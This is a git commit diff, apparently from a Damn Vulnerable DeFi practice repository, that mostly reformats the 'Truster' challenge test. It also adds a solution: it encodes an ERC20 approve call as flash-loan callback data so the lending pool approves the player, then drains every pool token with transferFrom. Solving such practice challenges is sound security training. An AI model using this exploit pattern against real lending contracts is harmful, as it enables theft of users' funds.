2607dab582cf66cfbe1287ec5f51727dfb5324b8
Abdullah Alsigar <abdullah.alsigar@gmail.com>
2024-05-26 20:14:09 +0300

    truster

--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -1,40 +1,50 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
 
-describe('[Challenge] Truster', function () {
-    let deployer, player;
-    let token, pool;
+describe("[Challenge] Truster", function () {
+  let deployer, player;
+  let token, pool;
 
-    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
+  const TOKENS_IN_POOL = 1000000n * 10n ** 18n;
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, player] = await ethers.getSigners();
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, player] = await ethers.getSigners();
 
-        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
-        expect(await pool.token()).to.eq(token.address);
+    token = await (
+      await ethers.getContractFactory("DamnValuableToken", deployer)
+    ).deploy();
+    pool = await (
+      await ethers.getContractFactory("TrusterLenderPool", deployer)
+    ).deploy(token.address);
+    expect(await pool.token()).to.eq(token.address);
 
-        await token.transfer(pool.address, TOKENS_IN_POOL);
-        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
+    await token.transfer(pool.address, TOKENS_IN_POOL);
+    expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);
 
-        expect(await token.balanceOf(player.address)).to.equal(0);
-    });
+    expect(await token.balanceOf(player.address)).to.equal(0);
+  });
 
-    it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
-    });
+  it("Execution", async function () {
+    /** CODE YOUR SOLUTION HERE */
+    const sig = ethers.utils.id("approve(address,uint256)").slice(0, 10);
+    const params = ethers.utils.defaultAbiCoder.encode(
+      ["address", "uint256"],
+      [player.address, TOKENS_IN_POOL],
+    );
+    const data = sig + params.slice(2);
+    await pool.flashLoan(0, player.address, token.address, data);
 
-    after(async function () {
-        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+    await token
+      .connect(player)
+      .transferFrom(pool.address, player.address, TOKENS_IN_POOL);
+  });
 
-        // Player has taken all tokens from the pool
-        expect(
-            await token.balanceOf(player.address)
-        ).to.equal(TOKENS_IN_POOL);
-        expect(
-            await token.balanceOf(pool.address)
-        ).to.equal(0);
-    });
+  after(async function () {
+    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
+
+    // Player has taken all tokens from the pool
+    expect(await token.balanceOf(player.address)).to.equal(TOKENS_IN_POOL);
+    expect(await token.balanceOf(pool.address)).to.equal(0);
+  });
 });
-
